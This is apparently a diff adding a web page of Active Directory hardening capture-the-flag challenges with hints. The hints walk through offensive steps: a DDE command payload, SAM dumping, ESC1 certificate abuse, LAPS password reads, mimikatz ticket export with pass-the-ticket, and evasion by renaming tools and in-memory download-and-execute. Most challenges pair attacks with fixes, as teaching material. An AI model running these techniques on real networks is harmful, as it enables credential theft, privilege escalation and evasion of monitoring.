+# Verify ASR status:
+Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
+Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions
+# Confirms D4F940AB... and 3B576869... are set to Block (1)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>ASR bypass techniques:</strong><br>
+            1. <strong>COM objects:</strong> Some COM objects (like <code>Shell.Application</code> or WScript.Shell via VBA) may not trigger the child process rule depending on how they're invoked.<br>
+            2. <strong>DDE instead of macros:</strong> DDE (Dynamic Data Exchange) can execute commands without macros: <code>{DDEAUTO c:\\windows\\system32\\cmd.exe "/k type C:\\Users\\victim\\Desktop\\flag.txt > C:\\temp\\out.txt"}</code><br>
+            3. <strong>Abuse exclusion paths:</strong> If the org has ASR exclusions (check <code>Get-MpPreference | Select-Object AttackSurfaceReductionOnlyExclusions</code>), write to that path.<br>
+            4. <strong>XLM macros (Excel 4.0):</strong> Legacy macro format sometimes bypasses modern ASR rules.<br>
+            5. <strong>Template injection:</strong> Macro runs from a remote template — may bypass depending on rule version.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 6: Escape the Tier</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Tiered administration is implemented. You've compromised a Tier 2 helpdesk account. Escalate to Tier 0 and read the flag on the Domain Controller at <code>C:\Tier0Flag\flag.txt</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># You are: YOURDOM\helpdesk_admin (Tier 2 — can only admin workstations)
+# Tiered model is enforced: Tier 0 accounts are denied logon to Tier 1/2
+# However, the implementation has flaws...
+#
+# Observations:
+# - You can admin all workstations in OU=Workstations,OU=Tier 2
+# - There are 200+ workstations
+# - A Tier 1 admin occasionally logs into workstations to troubleshoot
+# - LAPS is NOT deployed on all workstations (some were missed)
+
+# Your access:
+net user helpdesk_admin /domain
+# Member of: Tier2-Admins, Remote Desktop Users
+
+# Check which workstations don't have LAPS
+Get-ADComputer -Filter * -SearchBase "OU=Workstations,OU=Tier 2,DC=domain,DC=local" `
+  -Properties ms-Mcs-AdmPwd | Where-Object { $_."ms-Mcs-AdmPwd" -eq $null } |
+  Select-Object Name</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Attack path:</strong><br>
+            1. Find workstations without LAPS — they likely share a common local admin password.<br>
+            2. As Tier 2 admin, dump SAM from one workstation: <code>reg save HKLM\SAM sam.hive; reg save HKLM\SYSTEM system.hive</code><br>
+            3. Crack or pass the local admin hash to other non-LAPS workstations.<br>
+            4. Wait for a Tier 1 admin to log into a workstation you control (check Event 4624 Type 10).<br>
+            5. When Tier 1 admin is logged in, dump their credentials (CG may not be on workstations).<br>
+            6. With Tier 1 access, look for a path to Tier 0: ADCS vulnerable templates, unconstrained delegation, DCSync rights, etc.<br>
+            7. Or: Check if any Tier 1 servers have unconstrained delegation — compromise those to capture Tier 0 TGTs.<br>
+            The key insight: tiered admin fails if credential hygiene isn't perfect at every level.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 7: ADCS Exploitation</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">The organization deployed ADCS but didn't harden the certificate templates. Exploit a vulnerable template to obtain a Domain Admin certificate and access the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># You are: YOURDOM\normaluser (standard domain user)
+# CA is at: DC01 running "DomainCA"
+# Flag: \\DC01\C$\CertFlag\flag.txt (Domain Admin required)
+
+# Enumerate templates
+.\Certify.exe find
+
+# You find a template called "WebServer-Legacy":
+# - Enrollment: Domain Users can enroll
+# - Subject Name: "Supply in the request" (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
+# - EKU: Client Authentication
+# - Requires: Manager approval = FALSE</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>ESC1 Exploitation:</strong><br>
+            1. Confirm the template is vulnerable: <code>.\Certify.exe find /vulnerable</code><br>
+            2. Request a certificate with the DA's UPN in the SAN:<br>
+            <code>.\Certify.exe request /ca:DC01\DomainCA /template:WebServer-Legacy /altname:administrator@domain.local</code><br>
+            3. Convert the cert to PFX: <code>openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx</code><br>
+            4. Use Rubeus to get a TGT with the cert: <code>.\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /ptt</code><br>
+            5. Access the flag: <code>type \\DC01\C$\CertFlag\flag.txt</code><br>
+            <strong>Fix:</strong> Remove "Supply in the request" from Subject Name, restrict enrollment to specific admin groups.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 8: LAPS Password Recovery</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">LAPS is deployed but the permissions are misconfigured. As a standard user, find which machines you can read the LAPS password for and use it to get the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># You are: YOURDOM\intern (standard domain user, member of "IT-Interns" group)
+# LAPS is deployed across all workstations
+# Flag: C:\Users\Administrator\Desktop\flag.txt on WS-FINANCE01
+
+# Check if you can read any LAPS passwords
+Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd |
+  Where-Object { $_."ms-Mcs-AdmPwd" -ne $null } |
+  Select-Object Name, "ms-Mcs-AdmPwd"
+
+# Alternatively, check your permissions on computer objects
+# The IT-Interns group was accidentally granted LAPS read on one OU...</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>1. Query all computers for LAPS passwords — you'll find you can read some: <code>Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object { $_."ms-Mcs-AdmPwd" -ne $null }</code><br>
+            2. Or check ACLs: <code>Find-AdmPwdExtendedRights -Identity "OU=Finance,DC=domain,DC=local"</code> — you'll see IT-Interns has read permission.<br>
+            3. Get the password for WS-FINANCE01: <code>Get-ADComputer WS-FINANCE01 -Properties ms-Mcs-AdmPwd | Select-Object "ms-Mcs-AdmPwd"</code><br>
+            4. Use the local admin creds: <code>Enter-PSSession -ComputerName WS-FINANCE01 -Credential (Get-Credential)</code><br>
+            5. Read the flag: <code>type C:\Users\Administrator\Desktop\flag.txt</code><br>
+            <strong>Fix:</strong> Remove IT-Interns from LAPS read delegation; only Tier 2 admins should have this permission.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 9: Audit Log Evasion</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Advanced audit policy and Sysmon are deployed. Perform your attack while generating minimal detectable events. The flag is at <code>\\DC01\NETLOGON\secret_flag.txt</code>. Your goal: read the flag without triggering the detection rules.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># You have: Domain user credentials + local admin on WS01
+# Monitoring in place:
+# - Sysmon with LSASS access monitoring (Event ID 10)
+# - Advanced Audit: Logon events, privilege use, process creation with command line
+# - Alert rule: Any 4672 event from non-admin accounts
+# - Alert rule: Any 4688 with "mimikatz" or "rubeus" in command line
+# - Alert rule: Sysmon Event 1 with suspicious parent-child (Office→cmd, etc.)
+# - Alert rule: Sysmon Event 3 connections to known-bad ports
+# - WEF forwarding all events to a SIEM collector
+#
+# Detection rules check every 5 minutes. If you trigger an alert, your account gets disabled.
+# You have 5 minutes after reading the flag to submit it.</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Evasion strategies:</strong><br>
+            1. <strong>Avoid LSASS:</strong> Don't dump credentials from LSASS — use Kerberoasting or LDAP enumeration instead.<br>
+            2. <strong>Rename tools:</strong> Copy Rubeus.exe as "svchost.exe" — evades command-line string matching.<br>
+            3. <strong>In-memory execution:</strong> Use <code>Invoke-Expression (New-Object Net.WebClient).DownloadString('...')</code> — no file on disk, no Sysmon Event 11.<br>
+            4. <strong>Access the share directly:</strong> You're a domain user — can you read \\DC01\NETLOGON? Try: <code>type \\DC01\NETLOGON\secret_flag.txt</code> — NETLOGON is often readable by Authenticated Users!<br>
+            5. <strong>Timestamp manipulation:</strong> Won't help with real-time forwarding, but might confuse forensics.<br>
+            6. The trick: NETLOGON share is typically readable by all domain users. No exploitation needed — just access it directly. The "hardening" focus makes you overthink it.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 10: Protected Users Bypass</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">The target Domain Admin is in the Protected Users group. NTLM is blocked, credentials aren't cached. Find another way to compromise their account and read <code>C:\DC01\AdminFlag\flag.txt</code>.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># You have: Local admin on a server (SVR01) in the same network as DC01
+# Target: admin_da@domain.local (member of Protected Users + Domain Admins)
+# Protected Users restrictions on this account:
+#   - No NTLM authentication
+#   - No credential caching
+#   - No DES/RC4 Kerberos
+#   - TGT lifetime = 4 hours, non-renewable
+#   - No delegation (CredSSP)
+#
+# The admin_da user logs into SVR01 via RDP occasionally for management tasks
+# Credential Guard is NOT enabled on SVR01 (only on Tier 0 systems)
+# Flag: C:\AdminFlag\flag.txt on DC01 (requires DA access)</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Protected Users prevents caching, but Kerberos tickets are still in memory during active sessions:</strong><br>
+            1. Wait for admin_da to RDP into SVR01 (monitor Event 4624 Type 10).<br>
+            2. While their session is active, dump Kerberos tickets: <code>.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"</code><br>
+            3. You'll get their TGT (valid for 4 hours, non-renewable). Even though NTLM hash isn't cached, the active TGT IS in memory.<br>
+            4. Pass-the-ticket: <code>.\Rubeus.exe ptt /ticket:admin_da_tgt.kirbi</code><br>
+            5. Access DC01: <code>type \\DC01\C$\AdminFlag\flag.txt</code><br>
+            6. <strong>Alternative:</strong> If Kerberos tickets aren't accessible, set up a keylogger or use RDP session hijacking (<code>tscon</code>).<br>
+            <strong>Defense:</strong> Enable Credential Guard on ALL systems (not just Tier 0), and use Remote Credential Guard for RDP.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 11: WMI Persistence Detection</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">An attacker has established WMI-based persistence on a compromised machine. Find the malicious WMI subscription, decode the payload, and recover the flag hidden in the encoded command.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># You are a blue-teamer investigating machine INFECTED01
+# Intel suggests WMI event subscription persistence
+# The flag is encoded within the attacker's persistence payload
+
+# Start investigation:
+Get-WMIObject -Namespace root\subscription -Class __EventFilter
+Get-WMIObject -Namespace root\subscription -Class __EventConsumer
+Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding
+
+# Or use PowerShell CIM cmdlets:
+Get-CimInstance -Namespace root/subscription -ClassName __EventFilter
+Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer
+Get-CimInstance -Namespace root/subscription -ClassName ActiveScriptEventConsumer</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p>1. List all WMI event consumers: <code>Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer | Select-Object Name, CommandLineTemplate</code><br>
+            2. You'll find a suspicious consumer with a Base64-encoded PowerShell command in <code>CommandLineTemplate</code>.<br>
+            3. Decode the payload: <code>[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("ENCODED_STRING"))</code><br>
+            4. The decoded command contains the flag as a comment or variable.<br>
+            5. To clean up: <code>Get-CimInstance -Namespace root/subscription -ClassName __EventFilter | Where-Object { $_.Name -eq "MalFilter" } | Remove-CimInstance</code><br>
+            <strong>Prevention:</strong> ASR rule <code>E6DB77E5-3DF2-4CF1-B95A-636979351E5B</code> blocks WMI persistence. Sysmon Events 19/20/21 detect it.</p>
+          </div>
+        </div>
+
+        <div class="ctf-card">
+          <h4>Challenge 12: Domain Hardening Assessment</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">You're performing a security assessment. The organization claims to be fully hardened. Find 5 misconfigurations that prove otherwise. Each misconfiguration reveals a piece of the flag.</p>
+          <div class="setup-code">
+<pre><code class="language-powershell"># You have: Standard domain user credentials
+# The domain claims to be "CIS Level 2 compliant"
+# Find misconfigurations to collect flag pieces:
+#
+# Piece 1: Related to password policy
+# Piece 2: Related to Kerberos configuration
+# Piece 3: Related to LDAP security
+# Piece 4: Related to service accounts
+# Piece 5: Related to certificate services
+#
+# Start enumeration:
+Get-ADDefaultDomainPasswordPolicy
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName, PasswordLastSet
+nslookup -type=srv _ldap._tcp.dc._msdcs.domain.local</code></pre>
+          </div>
+          <button class="hint-toggle">Show Hint</button>
+          <div class="hint-content">
+            <p><strong>Misconfigs to find:</strong><br>
+            1. <strong>Password policy:</strong> <code>Get-ADDefaultDomainPasswordPolicy</code> — MinPasswordLength is only 8 (CIS requires 14). Flag piece in the domain description.<br>
+            2. <strong>Kerberos:</strong> <code>Get-ADUser -Filter * -Properties msDS-SupportedEncryptionTypes</code> — RC4 still enabled. The krbtgt last password change reveals piece 2.<br>
+            3. <strong>LDAP:</strong> Use ldapsearch without signing — if it succeeds, signing isn't required. The LDAP banner contains piece 3.<br>
+            4. <strong>Service accounts:</strong> Find accounts with SPNs and PasswordLastSet > 2 years ago. Description field contains piece 4.<br>
+            5. <strong>ADCS:</strong> <code>.\Certify.exe find /vulnerable</code> — an ESC1 template exists. The template description has piece 5.<br>
+            Combine all 5 pieces for the full flag.</p>
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</body>
+</html>
